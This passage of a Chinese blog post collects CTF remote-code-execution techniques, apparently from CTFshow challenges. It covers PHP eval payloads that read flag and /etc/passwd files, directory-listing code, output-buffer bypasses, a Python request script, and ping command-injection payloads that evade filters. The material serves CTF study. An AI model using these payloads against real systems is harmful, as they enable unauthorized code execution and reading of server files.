+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/bzip2 flag.php把flag.php给压缩</span><br><span class="line">访问url+flag.php.bz2下载flag.php</span><br><span class="line">若不能出现字母，需换为</span><br><span class="line">?c=/???/???/????2 ????.???</span><br></pre></td></tr></table></figure>
+<h2 id="bash数字编码"><a class="markdownIt-Anchor" href="#bash数字编码"></a> Bash数字编码</h2>
+<p><code>$'\xxx'</code> 是 Bash 和其他类 Unix shell 中的一种语法，用于表示转义字符，其中 <code>xxx</code> 是一个八进制数，对应 ASCII 字符。</p>
+<p>例：</p>
+<p><strong><code>$'\164\141\143'</code></strong>:</p>
+<ul>
+<li><code>\164</code> 是八进制数，对应的十进制是 <code>116</code>，ASCII 字符是 <code>t</code>。</li>
+<li><code>\141</code> 是八进制数，对应的十进制是 <code>97</code>，ASCII 字符是 <code>a</code>。</li>
+<li><code>\143</code> 是八进制数，对应的十进制是 <code>99</code>，ASCII 字符是 <code>c</code>。</li>
+<li>组合起来是字符串 <code>&quot;tac&quot;</code>。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tac flag.php</span><br><span class="line">$&#x27;\164\141\143&#x27; $&#x27;\146\154\141\147\56\160\150\160&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="构造数字"><a class="markdownIt-Anchor" href="#构造数字"></a> (())构造数字</h2>
+<p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令</p>
+<p>可以使用$获取 (( )) 命令的结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(()) 代表一次运算，括号内可以填入运算式，因为里面为空，所以结果会被解析为0</span><br><span class="line">对0取反可以得到-1，使用表达式表示为$(( ~$(()) ))</span><br><span class="line">两个双小括号运算符相连，默认为相加，如$(( $(~$(())) $(( ~$(()))) )) --&gt; -1+(-1)=-2</span><br><span class="line">通过上述方法我们可以构造出-37，又-37取反得到36，所以在$(( ~$(( )) ))中放入37个$(( ~$(()) ))，即可构造出数字36</span><br></pre></td></tr></table></figure>
+<h2 id="命令函数被禁读取特定文件"><a class="markdownIt-Anchor" href="#命令函数被禁读取特定文件"></a> 命令函数被禁读取特定文件</h2>
+<p>代码示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>原因：eval在php里面是执行代码层面的函数，无法直接执行linux命令。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c=echo file_get_contents(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include($_POST[&#x27;w&#x27;]);&amp;w=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">c=readgzfile(&quot;/flag.txt&quot;);</span><br><span class="line">  //readgzfile 是 PHP 中的一个函数，用于读取 gzip 压缩的文件并直接输出其内容。</span><br><span class="line">  //如果文件不是 gzip 压缩的，它也会尝试读取并输出文件内容。</span><br><span class="line">c=var_dump((new SplFileObject(&quot;/flag.txt&quot;))-&gt;fpassthru());</span><br><span class="line">c=echo (new SplFileObject(&#x27;/flag.txt&#x27;))-&gt;fread(1000);</span><br><span class="line">  //fpassthru 是 SplFileObject 类的一个方法，用于将文件的剩余内容直接输出到输出缓冲区</span><br><span class="line">  //fread(1000) 读取文件的前 1000 个字节。</span><br></pre></td></tr></table></figure>
+<h2 id="linux花式读取文件"><a class="markdownIt-Anchor" href="#linux花式读取文件"></a> Linux花式读取文件</h2>
+<p>注:目标是获取flag.txt的内容</p>
+<p><strong>static-sh读取文件：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static-sh ./flag.txt</span><br></pre></td></tr></table></figure>
+<p><strong>paste读取文件:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paste ./flag.txt /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><strong>diff读取文件 :</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff ./flag.txt /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><strong>od读取文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">od -a ./flag.txt</span><br></pre></td></tr></table></figure>
+<p><strong>bzmore读取文件:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bzmore ./flag.txt</span><br></pre></td></tr></table></figure>
+<p><strong>bzless读取文件：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bzless ./flag.txtecho `bzless ./flag.txt`</span><br></pre></td></tr></table></figure>
+<p><strong>curl读取文件：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl file:///home/coffee/flag</span><br></pre></td></tr></table></figure>
+<h2 id="扫描目录文件"><a class="markdownIt-Anchor" href="#扫描目录文件"></a> 扫描目录文件</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))</span><br><span class="line">&#123;  </span><br><span class="line">$c= $_POST[&#x27;c&#x27;];     </span><br><span class="line">eval($c);</span><br><span class="line">&#125;else&#123;   </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="scandir"><a class="markdownIt-Anchor" href="#scandir"></a> scandir</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(&#x27;.&#x27;)); //返回当前目录的文件和子目录列表。</span><br><span class="line">|</span><br><span class="line">c=print_r(scandir(dirname(&#x27;.&#x27;)));</span><br><span class="line">|</span><br><span class="line">c=var_dump(scandir(&#x27;/&#x27;));//返回根目录文件</span><br><span class="line">|</span><br><span class="line">c=echo json_encode(scandir(&quot;/&quot;));//返回根目录文件</span><br><span class="line">|</span><br><span class="line">c=echo(implode(&quot;--&quot;,scandir(&quot;/&quot;)));//返回根目录文件</span><br><span class="line">|</span><br><span class="line">c=var_export(scandir(&quot;/&quot;));//返回根目录文件</span><br></pre></td></tr></table></figure>
+<h3 id="glob"><a class="markdownIt-Anchor" href="#glob"></a> glob</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(glob(&#x27;*&#x27;));  //glob(&#x27;*&#x27;) 列出当前目录的所有文件和子目录。</span><br></pre></td></tr></table></figure>
+<h3 id="递归扫描"><a class="markdownIt-Anchor" href="#递归扫描"></a> 递归扫描</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c=function scan($dir)&#123;</span><br><span class="line">foreach(scandir($dir) as $f)&#123;</span><br><span class="line">if($f==&#x27;.&#x27;||$f==&#x27;..&#x27;)</span><br><span class="line">continue;</span><br><span class="line">$path=$dir.&#x27;/&#x27;.$f;</span><br><span class="line">if(is_dir($path))&#123;</span><br><span class="line">echo &quot;DIR: $path\n&quot;;</span><br><span class="line">scan($path);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;FILE: $path\n&quot;;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">scan(&#x27;.&#x27;);//递归列出当前目录及其子目录中的所有文件和目录。</span><br></pre></td></tr></table></figure>
+<h3 id="opendir-和-readdir"><a class="markdownIt-Anchor" href="#opendir-和-readdir"></a> <code>opendir</code> 和 <code>readdir</code></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$dir=opendir(&#x27;.&#x27;);while(($file=readdir($dir))!==false)&#123;echo $file.&quot;\n&quot;;&#125;closedir($dir);</span><br></pre></td></tr></table></figure>
+<h3 id="directoryiteratorfilesystemiterator"><a class="markdownIt-Anchor" href="#directoryiteratorfilesystemiterator"></a> <strong><code>DirectoryIterator</code>/<code>FilesystemIterator</code></strong></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c=$dir=new DirectoryIterator(&quot;/&quot;);</span><br><span class="line">foreach($dir as $f)&#123;</span><br><span class="line">    echo($f.&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">或将DirectoryIterator改为FilesystemIterator</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">c=?&gt;&lt;?php    //前面的?&gt;用来闭合&lt;?</span><br><span class="line">	$a=new DirectoryIterator(&quot;glob:///*&quot;);   //php使用glob遍历文件夹</span><br><span class="line">	foreach($a as $f) </span><br><span class="line">	&#123;</span><br><span class="line">		echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">	&#125; </span><br><span class="line">	exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="劫持缓冲区"><a class="markdownIt-Anchor" href="#劫持缓冲区"></a> 劫持缓冲区</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">源码</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
+<p>函数解释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$s = ob_get_contents();//得到缓冲区的数据。`</span><br><span class="line">`ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</span><br></pre></td></tr></table></figure>
+<p><strong>法一</strong></p>
+<p><code>c=var_export(scandir('/'));</code>发现输出的一大堆问号，原来是源码中用函数将缓冲区的所有字符全部替换为问号，那么可以用<strong>exit()/die()提前结束</strong>，这样就不会将字符替换为问号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit();</span><br><span class="line">c=include(&quot;/flag.txt&quot;);die();</span><br></pre></td></tr></table></figure>
+<p><strong>法二</strong></p>
+<p>在替换缓冲区内容之前直接将缓存区内容送出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ob_flush();</span><br><span class="line">ob_end_flush();</span><br><span class="line">payload示例：</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);ob_flush();</span><br></pre></td></tr></table></figure>
+<p><strong>法三</strong></p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://64fe58eb-5766-484d-b8db-bd1f4b3ab1c2.chall.ctf.show/&quot;</span><br><span class="line"></span><br><span class="line">d = &#123;&#x27;c&#x27;: &#x27;include(&quot;/flag.txt&quot;);echo ~ob_get_contents();&#x27;&#125;</span><br><span class="line">	//echo ~ob_get_contents();输出缓冲区的内容，并对其进行按位取反操作。</span><br><span class="line">s = requests.post(url, d).content</span><br><span class="line"></span><br><span class="line">for i in s:</span><br><span class="line">    print(chr(~i&amp;0xff), end=&#x27;&#x27;)</span><br><span class="line">    //对每个字节 i，执行按位取反操作 ~i，然后与 0xff 进行按位与操作（确保结果为8位无符号整数）。</span><br><span class="line">使用 chr() 将处理后的字节转换为对应的字符，并打印出来。</span><br></pre></td></tr></table></figure>
+<h2 id="ping命令"><a class="markdownIt-Anchor" href="#ping命令"></a> ping命令</h2>
+<p>一般用法</p>
+<p>Ping命令的主要作用是通过发送数据包并接收应答信息来检测两台计算机之间的网络。ping是一个十分基本但又十分重要的TCP/IP网络工具</p>
+<p>现在它的作用主要为：</p>
+<ol>
+<li>通常用来检测网络的是否连通和测试网络速度；</li>
+<li>也可以根据域名得到相应主机的IP地址；</li>
+<li>根据ping返回的TTL值来判断对方所使用的操作系统及数据包经过路由器数量。</li>
+<li>因为具备以上功能，ping命令常常被黑客用来进行网络扫描和攻击。</li>
+</ol>
+<p><strong>具体注入方法</strong><br />
+看到ping命令就可以利用截断来执行新的命令。<br />
+首先测试所有的截断符号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">‘$’</span><br><span class="line">‘;’</span><br><span class="line">‘|’</span><br><span class="line">‘-’</span><br><span class="line">‘(’</span><br><span class="line">‘)’</span><br><span class="line">‘反引号’</span><br><span class="line">‘||’</span><br><span class="line">‘&amp;&amp;’</span><br><span class="line">‘&amp;’</span><br><span class="line">‘&#125;’</span><br><span class="line">‘&#123;’</span><br><span class="line">&#x27;%0a’可以当作空格来用；</span><br></pre></td></tr></table></figure>
+<p>利用截断符号配合普通命令简单问题基本就出来；<br />
+例如：ip=127.0.0.1;cat /home/flag.txt<br />
+简单的flag就出来了，也可以配合其他的进行。</p>
+<h3 id="分号用法"><a class="markdownIt-Anchor" href="#分号用法"></a> “;”分号用法</h3>
+<p>方式：command1 ; command2</p>
+<p>用;号隔开每个命令， 每个命令按照从左到右的<strong>顺序</strong>执行， 彼此之间不关心是否失败， 所有命令都会执行。</p>
+<h3 id="管道符用法"><a class="markdownIt-Anchor" href="#管道符用法"></a> “| ”管道符用法</h3>
+<p>上一条命令的<strong>输出</strong>，作为下一条命令<strong>参数</strong>。</p>
+<p>CTF里面：ping 127.0.0.1 | ls(只执行ls不执行前面的）<br />
+方式：command1 | command</p>
+<h3 id="符号用法"><a class="markdownIt-Anchor" href="#符号用法"></a> “&amp;”符号用法</h3>
+<p>ctf中用法 ping 127.0.0.1 &amp; ls(先执行ls后执行ping)</p>
+<p>&amp;放在启动参数后面表示设置此进程为后台进程</p>
+<p>方式：command1 &amp; command2</p>
+<p>默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作。<br />
+对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;'实现这个目的。</p>
+<h3 id="符号用法与"><a class="markdownIt-Anchor" href="#符号用法与"></a> “&amp;&amp;”符号用法（与）</h3>
+<p>ctf中用法 ping 127.0.0.1 &amp;&amp; ls（ping命令正确才执行ls 要是ping 1 &amp;&amp; ls ls就不会执行)</p>
+<p>shell 在执行某个命令的时候，会返回一个返回值，该返回值保存在 shell 变量 $? 中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当 $? == 0 时，表示执行成功；</span><br><span class="line">当 $? == 1 时（非0的数，返回值在0-255间），表示执行失败。</span><br></pre></td></tr></table></figure>
+<p>有时候，下一条命令依赖前一条命令是否执行成功。<br />
+如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。<br />
+shell 提供了 &amp;&amp; 和 || 来实现命令执行控制的功能，shell 将根据 &amp;&amp; 或 || 前面命令的返回值来控制其后面命令的执行。<br />
+语法格式如下：<br />
+command1 &amp;&amp; command2 [&amp;&amp; command3 …]<br />
+命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</p>
+<p>只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。<br />
+只要有一个命令返回假（命令返回值 $? == 1），后面的命令就不会被执行。</p>
+<h3 id="符号用法或"><a class="markdownIt-Anchor" href="#符号用法或"></a> “||”符号用法（或）</h3>
+<p>和&amp;&amp;相反 左边为假才执行命令二<br />
+语法格式如下：<br />
+command1 || command2 [|| command3 …]</p>
+<p>举例，ping命令判断存活主机，注意 &amp;&gt;要连起来写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 -w 1 192.168.1.1 &amp;&gt; /dev/null &amp;&amp; result=0 ||result=1    if [ &quot;$result&quot; == 0 ];then    echo &quot;192.168.1.1 is UP!&quot;     else    echo &quot;192.168.2.1 is DOWN!&quot;   fi</span><br></pre></td></tr></table></figure>
+<h3 id="ping命令执行例题"><a class="markdownIt-Anchor" href="#ping命令执行例题"></a> ping命令执行例题</h3>
+<p><img src="../images/20250311203548095.png" alt="image-20250311203548095" /></p>
+<p>命令执行绕过，过滤一些命令：ls,cat,|,flag等。但是反引号可以执行命令。<br />
+通过拼接，可以拼接出来：ls 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;`a=&quot;l&quot;;b=&quot;s&quot;;c=$a$b;$c`</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250311203652981.png" alt="image-20250311203652981" /></p>
+<p>可以发现 flag就在下面那个回显里<br />
+针对<strong>空格</strong>过滤，一串字符串中可以使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br></pre></td></tr></table></figure>
+<p>再拼接命令来查看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;`a=<span class="string">&quot;ca&quot;</span>;b=<span class="string">&quot;t<span class="variable">$&#123;IFS&#125;</span>fla&quot;</span>;c=<span class="string">&quot;g&quot;</span>;d=$a$b<span class="variable">$c</span>;<span class="variable">$d</span>`</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250311203744790.png" alt="image-20250311203744790" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW-sql" class="lazyload">
+        
+        <a href="/2025/03/09/CTFSHOW-sql/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            CTFSHOW-sql
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="php原生文件操作类" class="lazyload">
+      
+      <a href="/2025/02/28/php%E5%8E%9F%E7%94%9F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%B1%BB/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          php原生文件操作类
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      fuboy
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        62.9k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        04:11
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text"> 小知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">2.</span> <span class="toc-text"> 无过滤：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4cat-sort%E7%AD%89%E5%92%8C%E7%A9%BA%E6%A0%BC"><span class="toc-number">3.</span> <span class="toc-text"> 过滤cat、sort等和空格：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4php%E5%92%8Cfile"><span class="toc-number">4.</span> <span class="toc-text"> 过滤php和file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rec"><span class="toc-number">5.</span> <span class="toc-text"> 无字母数字rec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0rec"><span class="toc-number">6.</span> <span class="toc-text"> 无参数rec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8linux%E8%B7%AF%E5%BE%84%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4"><span class="toc-number">7.</span> <span class="toc-text"> 用Linux路径构造命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%B9%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">8.</span> <span class="toc-text"> 压缩目标文件并下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash%E6%95%B0%E5%AD%97%E7%BC%96%E7%A0%81"><span class="toc-number">9.</span> <span class="toc-text"> Bash数字编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%95%B0%E5%AD%97"><span class="toc-number">10.</span> <span class="toc-text"> (())构造数字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%87%BD%E6%95%B0%E8%A2%AB%E7%A6%81%E8%AF%BB%E5%8F%96%E7%89%B9%E5%AE%9A%E6%96%87%E4%BB%B6"><span class="toc-number">11.</span> <span class="toc-text"> 命令函数被禁读取特定文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E8%8A%B1%E5%BC%8F%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">12.</span> <span class="toc-text"> Linux花式读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-number">13.</span> <span class="toc-text"> 扫描目录文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#scandir"><span class="toc-number">13.1.</span> <span class="toc-text"> scandir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#glob"><span class="toc-number">13.2.</span> <span class="toc-text"> glob</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%92%E5%BD%92%E6%89%AB%E6%8F%8F"><span class="toc-number">13.3.</span> <span class="toc-text"> 递归扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#opendir-%E5%92%8C-readdir"><span class="toc-number">13.4.</span> <span class="toc-text"> opendir 和 readdir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#directoryiteratorfilesystemiterator"><span class="toc-number">13.5.</span> <span class="toc-text"> DirectoryIterator&#x2F;FilesystemIterator</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">14.</span> <span class="toc-text"> 劫持缓冲区</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ping%E5%91%BD%E4%BB%A4"><span class="toc-number">15.</span> <span class="toc-text"> ping命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E5%8F%B7%E7%94%A8%E6%B3%95"><span class="toc-number">15.1.</span> <span class="toc-text"> “;”分号用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6%E7%94%A8%E6%B3%95"><span class="toc-number">15.2.</span> <span class="toc-text"> “| ”管道符用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E7%94%A8%E6%B3%95"><span class="toc-number">15.3.</span> <span class="toc-text"> “&amp;”符号用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E7%94%A8%E6%B3%95%E4%B8%8E"><span class="toc-number">15.4.</span> <span class="toc-text"> “&amp;&amp;”符号用法（与）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E7%94%A8%E6%B3%95%E6%88%96"><span class="toc-number">15.5.</span> <span class="toc-text"> “||”符号用法（或）</span></a></li><li 